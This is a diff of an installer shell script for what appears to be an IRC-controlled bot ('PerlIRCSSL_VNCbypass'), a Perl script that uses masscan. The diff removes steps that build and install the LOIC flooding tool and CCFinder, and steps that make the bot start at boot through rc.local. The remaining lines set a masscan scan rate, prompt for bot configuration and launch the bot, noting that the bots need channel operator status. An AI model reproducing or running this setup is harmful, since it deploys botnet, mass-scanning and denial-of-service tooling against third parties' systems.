@@ -28,21 +28,6 @@ perl -MCPAN -e reload CPAN;
  cpan -fi Net::Address::IP::Local;
 fi
 esac
-cd ~/PerlIRCSSL_VNCbypass
-git clone https://github.com/xymostech/loic.git;
-cd loic;
-make -j8;
-cd ..;
- mv loic/loic /bin/loic;
- chmod +x /bin/loic;
-rm -rf loic/;
-git clone https://github.com/independentcod/CCFinder;
-cd CCFinder/CCFinder-Linux/;
-cmake . && make -j8 &&  make install;
-sh bootstrap.sh;
- mv ccfinder ../../;
-cd ~/PerlIRCSSL_VNCbypass
-clear;
 read -p "Proceed to bot configurations? Y or LEAVE BLANK + ENTER" choice
 case $choice in
  Y)  
@@ -73,18 +58,6 @@ fi
 if read -p "Masscan RATE-LIMIT/Recommended: 25000" mrate; then
  sed -i "perlircssl.pl" -e "s|--rate 25000|--rate "$mrate"|g" "perlircssl.pl"
 fi
- mv rc-local.service /etc/systemd/system/rc-local.service;
- systemctl enable rc-local;
-echo '#!/bin/sh -e' >rc.local;
-if [ $USER = "root" ]; then
-echo perl /root/PerlIRCSSL_VNCbypass/perlircssl.pl >>rc.local;
-else
-echo perl /home/$USER/PerlIRCSSL_VNCbypass/perlircssl.pl >>rc.local;
-fi
-echo exit 0 >>rc.local;
- mv rc.local /etc/;
- chown $USER /etc/rc.local;
- chmod 755 /etc/rc.local;
 read -p "In order for bot to work you need to be operator in the channel, it also must be registered with services and YOU MUST autovoice your bots else you will not get any output in the server, ARE YOU READY TO LAUNCH THE PERL SCRIPT??? (Y or LEAVE BLANK + ENTER" choices
 case $choices in
  Y)  perl perlircssl.pl &;;  
